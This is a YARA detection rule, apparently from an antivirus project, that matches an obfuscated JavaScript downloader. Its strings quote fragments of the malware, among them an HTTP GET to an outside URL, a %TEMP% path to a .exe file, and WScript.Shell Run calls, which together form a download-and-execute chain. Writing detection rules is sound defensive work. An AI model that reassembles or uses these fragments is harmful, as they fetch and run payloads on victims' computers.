rule sig_20160328_6ec50c18ed7879a031275d3e86c7f55f {
  meta:
    description = "datamaliciousorder - file 20160328_6ec50c18ed7879a031275d3e86c7f55f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "f4a3fca311fd28c6add6e02013a46bbbdfa81b28b4ba128d322bff46c2421229"

  strings:
    $s1  = "function Xocbwvndoj() {return Fcbdsffyhs[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"JbkFLfzJUiyz.exe\";};" fullword ascii
    $s2  = "Jdpaopet[Loklkzf](\"GET\", \"http://foothillsofhemet.com/k4sifs\", false);" fullword ascii
    $s3  = "do {WScript[Vueycpqmdp](Kgubjjw() * 11)} while (Jdpaopet[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Fcbdsffyhs = function Asvltcjpv() {return WScript[Xzpfbyawjo](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Yjfdxjkff(Shdfbtn, Gqwar){return Shdfbtn - Gqwar;};" fullword ascii
    $s6  = "function Cocuh() {return ((Vrgmmt == true) && (Vrgmmt == Gowlwwvyhl)) ? 1 : Pluqurx;};" fullword ascii
    $s7  = "function Wwtctl(Tmvzctu){Fcbdsffyhs[\"Run\"](Tmvzctu, Pluqurx, Pluqurx);};" fullword ascii
    $s8  = "function Jmtxorv(Ojcws) {var Kfpzf = (1, 2, 3, 4, 5, Ojcws); return Kfpzf;};" fullword ascii
    $s9  = "function Zhkmfvtwa(){return Dfszm;};" fullword ascii
    $s10 = "var Ahhnqd = new this[\"Date\"]();" fullword ascii
    $s11 = "function Zsfwnekg(){return Xzpfbyawjo;};" fullword ascii
    $s12 = "var Vrgmmt = false;" fullword ascii
    $s13 = "function Rbzcruv()" fullword ascii
    $s14 = " while (Maixd){" fullword ascii
    $s15 = "var Vobhapmjci = false;" fullword ascii
    $s16 = "var Gowlwwvyhl = false;" fullword ascii
    $s17 = "Vrgmmt = true; " fullword ascii
    $s18 = "function Kgubjjw(){return 22;};" fullword ascii
    $s19 = "Gowlwwvyhl = true; " fullword ascii
    $s20 = "return Yjfdxjkff(Ilcaopg, Qnhzxl);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}